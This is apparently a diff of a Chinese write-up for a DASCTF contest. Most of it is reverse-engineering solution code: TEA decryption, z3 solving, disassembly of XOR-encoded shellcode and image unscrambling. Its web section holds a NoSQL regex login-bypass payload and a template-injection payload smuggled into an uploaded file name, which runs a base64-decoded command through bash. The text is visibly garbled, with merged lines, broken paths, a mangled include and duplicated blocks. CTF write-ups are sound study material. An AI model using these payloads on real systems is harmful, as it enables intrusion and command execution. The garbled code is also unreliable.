@@ -29,7 +29,8 @@ function filter(str) { return /gt|lt|lte|gte|eq|ne|where/.test(str)}
 
 data.output = '{"id":"3", "filename":"' + req.files.file.name + '", "filesize":"' + req.files.file.size + '", "mimetype":"' + req.files.file.mimetype + '", "filehash":"' + req.files.file.md5 + '"}'res.render('home.squirrelly', JSON.parse(data.output));
 
-QQ.jpg","autoEscape":false,"defaultFilter":"e');require = global.require || global.process.mainModule.constructor._load; require('child_process').exec('echo L2J....Q==|base64 -d|bash');c.l('F','e
+QQ.jpg","autoEscape":
+false,"defaultFilter":"e');require = global.require || global.process.mainModule.constructor._load; require('child_process').exec('echo L2J....Q==|base64 -d|bash');c.l('F','e
 
 02
 
@@ -39,9 +40,10 @@ Re
 
 babytea
 
-#include <stdio.h> #include <stdint.h> unsigned int dword_69F038 = 0x1234567;unsigned int dword_69F03C = 0x89ABCDEF;//解密函数 void decrypt (uint32_t* v, uint32_t* k,uint32_t Xor1,uint32_t Xor2) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9E3779B1; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ dword_69F038 = v0; dword_69F03C = v1; uint32_t summ[0x20] = {0}; for(i = 0;i<=31;i++){ sum += delta; if((sum >> 0x1f) == 0){ sum ^= 0x1234567; } summ[i] = sum; }
+#include <stdio.h> #include <stdint.h> unsigned int dword_69F038 = 0x1234567;
+unsigned int dword_69F03C = 0x89ABCDEF;//解密函数 void decrypt (uint32_t* v, uint32_t* k,uint32_t Xor1,uint32_t Xor2) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9E3779B1; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ dword_69F038 = v0; dword_69F03C = v1; uint32_t summ[0x20] = {0}; for(i = 0;i<=31;i++){ sum += delta; if((sum >> 0x1f) == 0){ sum ^= 0x1234567; } summ[i] = sum; }
 
- for (i=0; i<32; i++) { /* basic cycle start */ v1 -= ((v0<<4) + k2) ^ (v0 + summ[31-i]) ^ ((v0>>5) + k3); v0 -= ((v1<<4) + k0) ^ (v1 + summ[31-i]) ^ ((v1>>5) + k1); } v0 ^= Xor1; v1 ^= Xor2; v[0]=v0; v[1]=v1; } 
+ for (i=0; i<32; i++) { /* basic cycle start */ v1 -= ((v0<<4) + k2) ^ (v0 + summ[31-i]) ^ ((v0>>5) + k3); v0 -= ((v1<<4) + k0) ^ (v1 + summ[31-i]) ^ ((v1>>5) + k1); } v0 ^= Xor1; v1 ^= Xor2; v[0]=v0; v[1]=v1; }
 void hexdump(unsigned int * t1,unsigned int *t2){ for(int i = 0;i<4;i++){ printf("%c",((unsigned char *)t1)[i]);
  } for(int i = 0;i<4;i++){ printf("%c",((unsigned char *)t2)[i]);
  }}void Tea(){ unsigned int cip[8] = { 0x5E27B530, 0xBDBEF7F3, 0xE3516A8F, 0x5D836CFE, 0xD83DFA09, 0x8EFC737A, 0x55A853A3, 0x7A564EC5 }; unsigned int key[4] = { 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476 }; unsigned int Xor0[8] = {0x1234567,0x5E27B530,0xE3516A8F,0xD83DFA09}; unsigned int Xor1[8] = {0x89ABCDEF,0xBDBEF7F3,0x5D836CFE,0x8EFC737A}; for(int i = 0;i<=3;i++){ uint32_t v[2]; v[0] = cip[i * 2]; v[1] = cip[i*2 +1];
@@ -67,7 +69,7 @@ beginn = 0x04017C0endd = beginn + len(data)Patch(beginn,endd,data)
 from z3 import *input = [BitVec(f"input[{i}]",8) for i in range(16)]dword_422000 = [0x0002A81A, 0x00028D44, 0x00022653, 0x0002E993, 0x000249B5, 0x00024265, 0x0003253D, 0x0002D77B, 0x000282C8, 0x00022892, 0x0002BD54, 0x0002482E, 0x00024C1F, 0x00028127, 0x0001E62E, 0x0001F009]Sol = Solver()Sol.add(dword_422000[12] == (199 * input[9] + 98 * input[7] + 192 * input[8] + 23 * input[12] + 79 * input[14] + 77 * input[10] + 185 * input[13] + 135 * input[15] + 119 * input[4] + 54 * input[0] + 41 * input[1] + 124 * input[6] + 18 * input[2] + 181 * input[11] + 191 * input[5] + 7 * input[3]) & 0xffffffff )
 Sol.add(dword_422000[3] == (210 * input[11] + 26 * input[15] + 169 * input[0] + 177 * input[13] + input[6] + 205 * input[8] + 223 * input[10] + 32 * input[5] + 225 * input[3] + 61 * input[14] + 72 * input[1] + 186 * input[9] + 253 * input[12] + 205 * input[2] + 49 * input[4] + 232 * input[7] ) & 0xffffffff )
 Sol.add(dword_422000[13] == (192 * input[3] + 22 * input[10] + 175 * input[1] + 184 * input[7] + 116 * input[15] + 70 * input[13] + 153 * input[14] + 119 * input[0] + 217 * input[6] + 123 * input[5] + 17 * input[2] + 244 * input[12] + 116 * input[8] + 46 * input[4] + 19 * input[9] + 130 * input[11])& 0xffffffff )
-Sol.add (dword_422000[7] == (41 * input[12] + 71 * input[7] + 185 * input[1] + 69 * input[11] + 142 * input[8] + 221 * input[5] + 24 * input[3] + 208 * input[6] + 41 * input[9] + 159 * input[2] + 231 * input[14] + 235 * input[13] + 225 * input[0] + (input[4] << 6) + 162 * input[10] + 134 * input[15] )& 0xffffffff )Sol.add (dword_422000[11] == (36 * input[12] + 220 * input[4] + 110 * input[13] + 45 * input[7] + 123 * input[9] + 133 * input[1] + 101 * input[5] + 137 * input[10] + 102 * input[0] + 227 * input[14] + 94 * input[15] + 18 * input[2] + 22 * input[6] + 189 * input[11] + 218 * input[8])& 0xffffffff )Sol.add (dword_422000[15] == (86 * input[11] + 31 * input[9] + 229 * input[6] + 27 * input[3] + 6 * input[12] + 13 * input[10] + 158 * input[1] + 89 * input[7] + 35 * input[15] + 126 * input[8] + 165 * input[13] + 220 * input[0] + 138 * input[5] + 100 * input[4] + 84 * input[14] + 175 * input[2]) & 0xffffffff )Sol.add(dword_422000[8] == ( 7 * input[1] + 28 * input[8] + 131 * input[10] + 6 * input[6] + 254 * input[0] + 130 * input[13] + 124 * input[3] + 55 * input[12] + 157 * input[14] + 175 * input[5] + 140 * input[4] + 241 * input[9] + 11 * input[11] + 211 * input[2] + 121 * input[7] + 200 * input[15] ) & 0xffffffff )Sol.add(dword_422000[6] == (195 * input[14] + 197 * input[13] + 218 * input[7] + 83 * input[1] + 98 * input[2] + 70 * input[10] + 229 * input[15] + 148 * input[11] + 195 * input[0] + 94 * input[6] + 211 * input[12] + 220 * input[9] + 81 * input[5] + 253 * input[8] + 78 * input[4] + 4 * input[3] ) & 0xffffffff ) Sol.add(dword_422000[14] == (3 * input[4] + 136 * input[7] + 156 * input[3] + 189 * input[1] + 244 * input[12] + 157 * input[15] + 83 * input[9] + 6 * input[0] + 113 * input[6] + 63 * input[14] + 35 * input[2] + 22 * input[8] + 26 * input[10] + 62 * input[11] + 98 * input[5] + 110 * input[13] )& 0xffffffff )Sol.add(dword_422000[4] == (96 * input[4] + 248 * input[8] + 191 * input[9] + 194 * input[2] + 154 * input[1] + 31 * input[6] + 157 * input[7] + 248 * input[13] + 81 * input[15] + 56 * input[10] + 52 * input[0] + 94 * input[12] + 212 * input[5] + 83 * input[3] + 83 * input[14] + 158 * input[11] )& 0xffffffff )Sol.add(dword_422000[1] == (67 * input[4] + 220 * input[2] + 123 * input[11] + 168 * input[5] + 23 * input[12] + 148 * input[7] + 127 * input[10] + 194 * input[1] + 132 * input[8] + 44 * input[0] + 60 * input[13] + 98 * input[15] + 38 * input[14] + 245 * input[9] + 159 * input[6] + 146 * input[3] )& 0xffffffff )Sol.add(dword_422000[5] == (132 * input[3] + 10 * input[7] + 95 * input[0] + 83 * input[10] + 99 * input[1] + 77 * input[12] + 195 * input[2] + 47 * input[6] + 38 * input[13] + 178 * input[8] + 74 * input[4] + 86 * input[11] + 208 * input[9] + 240 * input[14] + 120 * input[5] + 43 * input[15] )& 0xffffffff )Sol.add(dword_422000[9] == (172 * input[1] + 110 * input[2] + 92 * input[7] + 126 * input[15] + 91 * input[0] + 77 * input[6] + 207 * input[5] + 249 * input[11] + 240 * input[12] + 129 * input[10] + 6 * input[13] + 100 * input[3] + input[14] + 76 * input[9] + 127 * input[4] + 4 * input[8] )& 0xffffffff )Sol.add(dword_422000[10] == (46 * input[15] + 37 * input[0] + 3 * input[3] + 72 * input[6] + 116 * input[7] + 186 * input[1] + 221 * input[14] + 236 * input[4] + 79 * input[2] + 175 * input[10] + 184 * input[9] + 160 * input[11] + 227 * input[12] + 99 * input[8] + 71 * input[13] + 4 * input[5] )& 0xffffffff )Sol.add(dword_422000[0] == (203 * input[3] + 31 * input[0] + 11 * input[14] + 149 * input[7] + 215 * input[5] + 206 * input[1] + 245 * input[6] + 9 * input[11] + 16 * input[10] + 241 * input[13] + 110 * input[8] + 175 * input[2] + 38 * input[4] + 227 * input[9] + 208 * input[12] + 8 * input[15] )& 0xffffffff )Sol.add(dword_422000[2] == (132 * input[3] + 119 * input[14] + 26 * input[8] + 24 * input[6] + 121 * input[11] + 235 * input[2] + 228 * input[12] + 34 * input[5] + 37 * input[15] + 24 * input[9] + 145 * input[13] + 199 * input[4] + 173 * input[10] + 58 * input[0] + 246 * input[7] + 199 * input[1]) & 0xffffffff ) 
+Sol.add (dword_422000[7] == (41 * input[12] + 71 * input[7] + 185 * input[1] + 69 * input[11] + 142 * input[8] + 221 * input[5] + 24 * input[3] + 208 * input[6] + 41 * input[9] + 159 * input[2] + 231 * input[14] + 235 * input[13] + 225 * input[0] + (input[4] << 6) + 162 * input[10] + 134 * input[15] )& 0xffffffff )Sol.add (dword_422000[11] == (36 * input[12] + 220 * input[4] + 110 * input[13] + 45 * input[7] + 123 * input[9] + 133 * input[1] + 101 * input[5] + 137 * input[10] + 102 * input[0] + 227 * input[14] + 94 * input[15] + 18 * input[2] + 22 * input[6] + 189 * input[11] + 218 * input[8])& 0xffffffff )Sol.add (dword_422000[15] == (86 * input[11] + 31 * input[9] + 229 * input[6] + 27 * input[3] + 6 * input[12] + 13 * input[10] + 158 * input[1] + 89 * input[7] + 35 * input[15] + 126 * input[8] + 165 * input[13] + 220 * input[0] + 138 * input[5] + 100 * input[4] + 84 * input[14] + 175 * input[2]) & 0xffffffff )Sol.add(dword_422000[8] == ( 7 * input[1] + 28 * input[8] + 131 * input[10] + 6 * input[6] + 254 * input[0] + 130 * input[13] + 124 * input[3] + 55 * input[12] + 157 * input[14] + 175 * input[5] + 140 * input[4] + 241 * input[9] + 11 * input[11] + 211 * input[2] + 121 * input[7] + 200 * input[15] ) & 0xffffffff )Sol.add(dword_422000[6] == (195 * input[14] + 197 * input[13] + 218 * input[7] + 83 * input[1] + 98 * input[2] + 70 * input[10] + 229 * input[15] + 148 * input[11] + 195 * input[0] + 94 * input[6] + 211 * input[12] + 220 * input[9] + 81 * input[5] + 253 * input[8] + 78 * input[4] + 4 * input[3] ) & 0xffffffff ) Sol.add(dword_422000[14] == (3 * input[4] + 136 * input[7] + 156 * input[3] + 189 * input[1] + 244 * input[12] + 157 * input[15] + 83 * input[9] + 6 * input[0] + 113 * input[6] + 63 * input[14] + 35 * input[2] + 22 * input[8] + 26 * input[10] + 62 * input[11] + 98 * input[5] + 110 * input[13] )& 0xffffffff )Sol.add(dword_422000[4] == (96 * input[4] + 248 * input[8] + 191 * input[9] + 194 * input[2] + 154 * input[1] + 31 * input[6] + 157 * input[7] + 248 * input[13] + 81 * input[15] + 56 * input[10] + 52 * input[0] + 94 * input[12] + 212 * input[5] + 83 * input[3] + 83 * input[14] + 158 * input[11] )& 0xffffffff )Sol.add(dword_422000[1] == (67 * input[4] + 220 * input[2] + 123 * input[11] + 168 * input[5] + 23 * input[12] + 148 * input[7] + 127 * input[10] + 194 * input[1] + 132 * input[8] + 44 * input[0] + 60 * input[13] + 98 * input[15] + 38 * input[14] + 245 * input[9] + 159 * input[6] + 146 * input[3] )& 0xffffffff )Sol.add(dword_422000[5] == (132 * input[3] + 10 * input[7] + 95 * input[0] + 83 * input[10] + 99 * input[1] + 77 * input[12] + 195 * input[2] + 47 * input[6] + 38 * input[13] + 178 * input[8] + 74 * input[4] + 86 * input[11] + 208 * input[9] + 240 * input[14] + 120 * input[5] + 43 * input[15] )& 0xffffffff )Sol.add(dword_422000[9] == (172 * input[1] + 110 * input[2] + 92 * input[7] + 126 * input[15] + 91 * input[0] + 77 * input[6] + 207 * input[5] + 249 * input[11] + 240 * input[12] + 129 * input[10] + 6 * input[13] + 100 * input[3] + input[14] + 76 * input[9] + 127 * input[4] + 4 * input[8] )& 0xffffffff )Sol.add(dword_422000[10] == (46 * input[15] + 37 * input[0] + 3 * input[3] + 72 * input[6] + 116 * input[7] + 186 * input[1] + 221 * input[14] + 236 * input[4] + 79 * input[2] + 175 * input[10] + 184 * input[9] + 160 * input[11] + 227 * input[12] + 99 * input[8] + 71 * input[13] + 4 * input[5] )& 0xffffffff )Sol.add(dword_422000[0] == (203 * input[3] + 31 * input[0] + 11 * input[14] + 149 * input[7] + 215 * input[5] + 206 * input[1] + 245 * input[6] + 9 * input[11] + 16 * input[10] + 241 * input[13] + 110 * input[8] + 175 * input[2] + 38 * input[4] + 227 * input[9] + 208 * input[12] + 8 * input[15] )& 0xffffffff )Sol.add(dword_422000[2] == (132 * input[3] + 119 * input[14] + 26 * input[8] + 24 * input[6] + 121 * input[11] + 235 * input[2] + 228 * input[12] + 34 * input[5] + 37 * input[15] + 24 * input[9] + 145 * input[13] + 199 * input[4] + 173 * input[10] + 58 * input[0] + 246 * input[7] + 199 * input[1]) & 0xffffffff )
 assert Sol.check() == satprint(Sol.model())
 input = [None] * 16input[11] = 51input[0] = 90input[2] = 1input[14] = 114input[6] = 186input[13] = 43input[5] = 42input[4] = 43input[12] = 113input[15] = 72input[1] = 45input[10] = 186input[9] = 179input[7] = 51input[8] = 72input[3] = 51
 idx = [0x02, 0x03, 0x05, 0x07, 0x0B, 0x0D, 0x11, 0x13, 0x17, 0x1D]byte_423D80 = [0xD1, 0x9C, 0x68, 0xC0, 0x13, 0xAC, 0x48, 0x32, 0xA3, 0xBA, 0x4C, 0xE7, 0x6D, 0xC8, 0x1C, 0xAB, 0xE2, 0x7A, 0x42, 0xE1, 0x7B, 0x16, 0x67, 0x03, 0xAE, 0x7E, 0xAA, 0x38, 0x22, 0x02, 0x39, 0x51, 0xC7, 0x79, 0xD7, 0xCB, 0xEF, 0x62, 0x98, 0xDC, 0x53, 0x72, 0x89, 0xA5, 0x4B, 0xC6, 0x86, 0xF6, 0xFC, 0x77, 0x5A, 0xF5, 0x2E, 0x3D, 0xB2, 0xFE, 0x59, 0x27, 0x80, 0x63, 0xDD, 0x1A, 0x12, 0x5E, 0xED, 0xB0, 0xBC, 0xC4, 0x5F, 0x11, 0xC9, 0x09, 0xC5, 0x75, 0x96, 0x0A, 0x2F, 0x00, 0x17, 0x81, 0x14, 0x47, 0xBB, 0x9D, 0x8E, 0x3C, 0xD6, 0xA1, 0xE0, 0xA2, 0x26, 0x5D, 0x08, 0x6E, 0x4E, 0xF1, 0xCF, 0x73, 0x8A, 0x90, 0x0B, 0xB3, 0x3E, 0xB6, 0x1F, 0xC3, 0xB7, 0xDA, 0x8D, 0x05, 0xEE, 0x18, 0x93, 0x3A, 0x6A, 0x8C, 0x43, 0x8F, 0xEB, 0xE9, 0x5B, 0x29, 0x37, 0x1E, 0x46, 0x33, 0x31, 0xFB, 0x35, 0x34, 0x61, 0x04, 0x0E, 0x2B, 0x74, 0xF9, 0x8B, 0x2C, 0x20, 0x0C, 0x7C, 0x28, 0x5C, 0xCA, 0xE6, 0x6B, 0xD8, 0x30, 0xE4, 0x21, 0x44, 0x70, 0x06, 0xA6, 0x60, 0x41, 0x84, 0x10, 0x95, 0x4F, 0x64, 0x83, 0xD2, 0x9A, 0xBE, 0xAF, 0x9F, 0x07, 0xC1, 0xB8, 0x3B, 0x65, 0xCC, 0x57, 0xB5, 0xD9, 0x92, 0xDE, 0x0D, 0xE3, 0xF3, 0xA4, 0xBD, 0x6F, 0xD3, 0x25, 0x88, 0x71, 0xFF, 0xA9, 0x36, 0xB1, 0x78, 0x24, 0x69, 0xAD, 0x19, 0xBF, 0xFD, 0xCD, 0x4A, 0xEA, 0x87, 0x91, 0xA8, 0x66, 0x82, 0x50, 0x0F, 0x99, 0x45, 0xF2, 0xD5, 0x9B, 0x94, 0x7D, 0xCE, 0xDB, 0xB9, 0x52, 0xE5, 0xF4, 0x01, 0x7F, 0xD4, 0x15, 0x2D, 0x3F, 0x1D, 0xA7, 0xC2, 0xFA, 0x40, 0xE8, 0xA0, 0x55, 0x6C, 0xF7, 0x1B, 0x58, 0x85, 0x56, 0x9E, 0xEC, 0x97, 0x23, 0xF0, 0x4D, 0xD0, 0xF8, 0x2A, 0x49, 0xB4, 0x76, 0x54, 0xDF]def Fun_0x1d(): for i in range(len(input)): for j in range(len(byte_423D80)): if byte_423D80[j] == input[i]: input[i] = j break
@@ -125,9 +127,12 @@ BadSecret
 
 [Char:'h' Frequency: 7] [Char:'a' Frequency: 6] [Char:'y' Frequency: 5] [Char:'c' Frequency: 4] [Char:'u' Frequency: 3] [Char:'m' Frequency: 2] [Char:'d' Frequency: 1]
 
-#include <iostream>#include <vector>#include <string>
+#include #include <vector>#include <string>
 using namespace std;
-const int INF = 1000000000;const int maxBit = 1 << 5;const int maxNode = 1 << 10;const int maxCode = 1 << 10;
+const int INF = 1000000000;
+const int maxBit = 1 << 5;
+const int maxNode = 1 << 10;
+const int maxCode = 1 << 10;
 // 节点信息结构struct Node { // 值 string value; // 权值 float weight; // 父节点 int parent; // 左子节点 int lchild; // 右子节点 int rchild;};
 // 编码信息结构struct Code { // 编码字符 int bit[maxBit]; // 开始位置 int start; // 值 string value;};
 // 节点数组Node huffman[maxNode];// 编码数组Code huffmanCode[maxCode];
@@ -153,12 +158,17 @@ int main() { while(true) { // 初始化
 
 babyimg
 
-lg = cip.load()for i in range(360):for j in range(360):flg[i,j] = f2_pix[i * 360 + j]      # 其实这种处理方法不很规整，bmp的像素不止3字节，还有一个保留位 =># typedef struct tagRGBQUAD# {#     BYTE rgbBlue; /*指定蓝色分量*/#     BYTE rgbGreen; /*指定绿色分量*/#     BYTE rgbRed; /*指定红色分量*/#     BYTE rgbReserved; /*保留，指定为0*/# } RGBQUAD;cip.save(r"C:UsersAdministratorDesktopDasctf11月赛re1babyimgflagggg.bmp")cip.show()
+lg = cip.load()for i in range(360):
+for j in range(360):
+flg[i,j] = f2_pix[i * 360 + j]      # 其实这种处理方法不很规整，bmp的像素不止3字节，还有一个保留位 =># typedef struct tagRGBQUAD
+# {#     BYTE rgbBlue; /*指定蓝色分量*/#     BYTE rgbGreen; /*指定绿色分量*/#     BYTE rgbRed; /*指定红色分量*/#     BYTE rgbReserved; /*保留，指定为0*/# } RGBQUAD;cip.save(r"C:
+UsersAdministratorDesktopDasctf11月赛re1babyimgflagggg.bmp")cip.show()
 
 然后是像素的交换
 
 from PIL import Image
-cip = Image.open(r"C:UsersAdministratorDesktopDasctf11月赛re1babyimgflag.enc.bmp")
+cip = Image.open(r"C:
+UsersAdministratorDesktopDasctf11月赛re1babyimgflag.enc.bmp")
 width = 360height = 360
 cip_pix = [[0 for i in range(360)] for j in range(360)]f1_pix = [[0 for i in range(360)] for j in range(360)]f2_pix = []fin_pix = []for i in range(height): for j in range(width): cip_pix[i][j] = (cip.getpixel((i,j)))
 
@@ -172,7 +182,8 @@ for i in range(len(f2_pix)): t0 = (f2_pix[i])[0] t1 = (f2_pix[i])[1] t2 = (f2_pi
 
 flg = cip.load()for i in range(360): for j in range(360): flg[i,j] = f2_pix[i * 360 + j] # 其实这种处理方法不很规整，bmp的像素不止3字节，还有一个保留位 => # typedef struct tagRGBQUAD # { # BYTE rgbBlue; /*指定蓝色分量*/ # BYTE rgbGreen; /*指定绿色分量*/ # BYTE rgbRed; /*指定红色分量*/ # BYTE rgbReserved; /*保留，指定为0*/ # } RGBQUAD; # 按理说我们应该添加上，但不添加也能正常显示
 
-cip.save(r"C:UsersAdministratorDesktopDasctf11月赛re1babyimgflagggg.bmp")cip.show()
+cip.save(r"C:
+UsersAdministratorDesktopDasctf11月赛re1babyimgflagggg.bmp")cip.show()
 
 EDI安全
 
@@ -183,32 +194,14 @@ EDI安全
 
 ```
 function filter(str) { return /gt|lt|lte|gte|eq|ne|where/.test(str)}
-```
-
-
-
-```
 {"username":{"$regex":"^admi"},"password": {"$regex":".*"}}
-```
-
-
-
-```
 data.output = '{"id":"3", "filename":"' + req.files.file.name + '", "filesize":"' + req.files.file.size + '", "mimetype":"' + req.files.file.mimetype + '", "filehash":"' + req.files.file.md5 + '"}'res.render('home.squirrelly', JSON.parse(data.output));
-```
+QQ.jpg","autoEscape":
+false,"defaultFilter":"e');require = global.require || global.process.mainModule.constructor._load; require('child_process').exec('echo L2J....Q==|base64 -d|bash');c.l('F','e
+    #include <stdio.h> #include <stdint.h> unsigned int dword_69F038 = 0x1234567;
+unsigned int dword_69F03C = 0x89ABCDEF;//解密函数 void decrypt (uint32_t* v, uint32_t* k,uint32_t Xor1,uint32_t Xor2) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9E3779B1; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ dword_69F038 = v0; dword_69F03C = v1; uint32_t summ[0x20] = {0}; for(i = 0;i<=31;i++){ sum += delta; if((sum >> 0x1f) == 0){ sum ^= 0x1234567; } summ[i] = sum; }
 
-
-
-```
-QQ.jpg","autoEscape":false,"defaultFilter":"e');require = global.require || global.process.mainModule.constructor._load; require('child_process').exec('echo L2J....Q==|base64 -d|bash');c.l('F','e
-```
-
-
-
-```
-#include <stdio.h> #include <stdint.h> unsigned int dword_69F038 = 0x1234567;unsigned int dword_69F03C = 0x89ABCDEF;//解密函数 void decrypt (uint32_t* v, uint32_t* k,uint32_t Xor1,uint32_t Xor2) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9E3779B1; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ dword_69F038 = v0; dword_69F03C = v1; uint32_t summ[0x20] = {0}; for(i = 0;i<=31;i++){ sum += delta; if((sum >> 0x1f) == 0){ sum ^= 0x1234567; } summ[i] = sum; }
-
- for (i=0; i<32; i++) { /* basic cycle start */ v1 -= ((v0<<4) + k2) ^ (v0 + summ[31-i]) ^ ((v0>>5) + k3); v0 -= ((v1<<4) + k0) ^ (v1 + summ[31-i]) ^ ((v1>>5) + k1); } v0 ^= Xor1; v1 ^= Xor2; v[0]=v0; v[1]=v1; } 
+ for (i=0; i<32; i++) { /* basic cycle start */ v1 -= ((v0<<4) + k2) ^ (v0 + summ[31-i]) ^ ((v0>>5) + k3); v0 -= ((v1<<4) + k0) ^ (v1 + summ[31-i]) ^ ((v1>>5) + k1); } v0 ^= Xor1; v1 ^= Xor2; v[0]=v0; v[1]=v1; }
 void hexdump(unsigned int * t1,unsigned int *t2){ for(int i = 0;i<4;i++){ printf("%c",((unsigned char *)t1)[i]);
  } for(int i = 0;i<4;i++){ printf("%c",((unsigned char *)t2)[i]);
  }}void Tea(){ unsigned int cip[8] = { 0x5E27B530, 0xBDBEF7F3, 0xE3516A8F, 0x5D836CFE, 0xD83DFA09, 0x8EFC737A, 0x55A853A3, 0x7A564EC5 }; unsigned int key[4] = { 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476 }; unsigned int Xor0[8] = {0x1234567,0x5E27B530,0xE3516A8F,0xD83DFA09}; unsigned int Xor1[8] = {0x89ABCDEF,0xBDBEF7F3,0x5D836CFE,0x8EFC737A}; for(int i = 0;i<=3;i++){ uint32_t v[2]; v[0] = cip[i * 2]; v[1] = cip[i*2 +1];
@@ -216,33 +209,18 @@ void hexdump(unsigned int * t1,unsigned int *t2){ for(int i = 0;i<4;i++){ printf
 
 }
 int main(){ Tea(); return 0;}
-```
-
-
-
-```
 from struct import *from capstone import *code = "74AACDA2CD29E664DD2121212199202121214AE921AA7429E7252B23AA64DDA2E120A864DD9820212121E0C021AA7429E7252B22AA64DDA2E120A864DDE664D925212121CA28AA6CD9A2E020A86CD9A25CD93F5610A25CDD2B5323CA08AA74D973C97BDEDEDEA2E5252E97E1A4E15535AA6C29226CDDAB74D9A930AA64DDA2E120A864DDCAE1AAC47CE2EDEDEDEDEDED5789EE81EE16A3FE3C400231C78B47FE680868028F47F252EA7139020281C60E8F4FF253EA45FDFDFD81C606C547EE02020202E90B8957EE81C0038B57EE817FEE08711C89470E52894F0A538957EE0DB44617F2890E87823C4002FDD381C60AE9D1894FFE31CFEAEC2D020289E75FC1"xcode = bytes.fromhex(code)print(hex(len(xcode)))for XOr in range(28,126): x32code = b"" for j in range(len(xcode)): x32code += pack("B",xcode[j] ^ XOr) if XOr == 0x21: for i in range(len(x32code)): print(hex(x32code[i]),end = ",") CP = Cs(CS_ARCH_X86, CS_MODE_32)
  for p in CP.disasm(x32code, 0x04017C0): # if XOr == 0x21: if p.address > 0x04017C0 + 0x90 - 0x10: print(f"{hex(XOr)} => ") print() for q in CP.disasm(x32code, 0x04017C0): print("0x%x:t%st%s" %(q.address, q.mnemonic, q.op_str)) break
 
 from struct import *from capstone import *code = "76A8CFA0CF3782DF1D612310E6AA66DF49294923AE66D373CB50182323A0E72FAE6ED372CB64DCDCDCA0E727E466CF23232323C82AA876CFA0E122AA76CFA05ECF29503DA8662F73A86E2B72A876CF2C956736D3A82FA6A31D6123DCF2A0E72BC8F0A86EDF10EECBCD0C2323A8C67EE076A8CF759B2723232348EB2F992223232348E120A8762B2C95272148F3249B2223232348E326A8562B2C9527254AE39C23232320F39B2223232348E328A8562B2C9527254AE39623232320F39B22232323F2C3A8562B2C95272548E33120F39B2223232348E325A8562B2C95272548E35F20F39B22232323E2C323A8562B2C95272548E30A20F39B2223232348E323A8"xcode = bytes.fromhex(code)print(hex(len(xcode)))for XOr in range(20,126): x32code = b"" for j in range(len(xcode)): x32code += pack("B",xcode[j] ^ XOr) if XOr == 0x23: for i in range(len(x32code)): print(hex(x32code[i]),end = ",") CP = Cs(CS_ARCH_X86, CS_MODE_32)
  for p in CP.disasm(x32code, 0x0401850): # if XOr == 0x21: if p.address > 0x0401850 + 0x100 - 0x10: print(f"{hex(XOr)} => ") print() for q in CP.disasm(x32code, 0x0401850): print("0x%x:t%st%s" %(q.address, q.mnemonic, q.op_str)) break
-```
-
-
-
-```
 import idcdata = [0x55,0x8b,0xec,0x83,0xec,0x8,0xc7,0x45,0xfc,0x0,0x0,0x0,0x0,0xb8,0x1,0x0,0x0,0x0,0x6b,0xc8,0x0,0x8b,0x55,0x8,0xc6,0x4,0xa,0x2,0x8b,0x45,0xfc,0x83,0xc0,0x1,0x89,0x45,0xfc,0xb9,0x1,0x0,0x0,0x0,0xc1,0xe1,0x0,0x8b,0x55,0x8,0xc6,0x4,0xa,0x3,0x8b,0x45,0xfc,0x83,0xc0,0x1,0x89,0x45,0xfc,0xc7,0x45,0xf8,0x4,0x0,0x0,0x0,0xeb,0x9,0x8b,0x4d,0xf8,0x83,0xc1,0x1,0x89,0x4d,0xf8,0x83,0x7d,0xf8,0x1e,0x77,0x31,0x83,0x7d,0xfc,0xa,0x72,0x2,0xeb,0x29,0x8b,0x55,0xf8,0x52,0xe8,0x5a,0xff,0xff,0xff,0x83,0xc4,0x4,0xf,0xb6,0xc0,0x85,0xc0,0x74,0x14,0x8b,0x4d,0x8,0x3,0x4d,0xfc,0x8a,0x55,0xf8,0x88,0x11,0x8b,0x45,0xfc,0x83,0xc0,0x1,0x89,0x45,0xfc,0xeb,0xc0,0x8b,0xe5,0x5d,0xc3,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0x76,0xa8,0xcf,0xa0,0xcf,0x37,0x82,0xdf,0x1d,0x61,0x23,0x10,0xe6,0xaa,0x66,0xdf,0x49,0x29,0x49,0x23,0xae,0x66,0xd3,0x73,0xcb,0x50,0x18,0x23,0x23,0xa0,0xe7,0x2f,0xae,0x6e,0xd3,0x72,0xcb,0x64,0xdc,0xdc,0xdc,0xa0,0xe7,0x27,0xe4,0x66,0xcf,0x23,0x23,0x23,0x23,0xc8,0x2a,0xa8,0x76,0xcf,0xa0,0xe1,0x22,0xaa,0x76,0xcf,0xa0,0x5e,0xcf,0x29,0x50,0x3d,0xa8,0x66,0x2f,0x73,0xa8,0x6e,0x2b,0x72,0xa8,0x76,0xcf,0x2c,0x95,0x67,0x36,0xd3,0xa8,0x2f,0xa6,0xa3,0x1d,0x61,0x23,0xdc,0xf2,0xa0,0xe7,0x2b,0xc8,0xf0,0xa8,0x6e,0xdf,0x10,0xee,0xcb,0xcd,0xc,0x23,0x23,0xa8,0xc6,0x7e,0xe0]def Patch(begin,end,Xor): for i in range(begin,end): idc.patch_byte(i,Xor[i-begin])
 beginn = 0x04017C0endd = beginn + len(data)Patch(beginn,endd,data)
